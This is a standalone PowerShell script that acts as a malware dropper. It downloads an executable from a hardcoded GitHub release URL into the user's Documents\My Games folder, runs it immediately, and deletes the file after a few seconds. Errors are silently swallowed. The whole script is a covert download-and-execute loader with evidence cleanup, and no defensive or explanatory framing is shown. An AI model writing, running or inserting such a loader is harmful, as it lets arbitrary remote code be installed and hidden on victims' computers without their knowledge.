$HardcodedUrl = "https://github.com/kagagagag/html/releases/download/test/test.exe"

try {
    $Uri = [System.Uri]$HardcodedUrl
    $FileNameFromUrl = $Uri.Segments[-1]
    if ([string]::IsNullOrWhiteSpace($FileNameFromUrl)) {
        $FileNameFromUrl = "dl_file_$(Get-Random).exe"
    }
} catch {
    exit 1
}

$targetDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'My Games'
$downloadPath = Join-Path $targetDir $FileNameFromUrl

try {
    New-Item -ItemType Directory -Path $targetDir -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest -Uri $HardcodedUrl -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
    if (Test-Path $downloadPath) {
        & $downloadPath
    } else {
        return
    }
} catch {
    # Execution stops here if download or execution fails with -ErrorAction Stop
} finally {
    Start-Sleep -Seconds 5
    if (Test-Path $downloadPath) {
        try {
            Remove-Item -Path $downloadPath -Force -ErrorAction Stop
        } catch {
            # Deletion error occurred, silently continue or handle if necessary
        }
    }
}
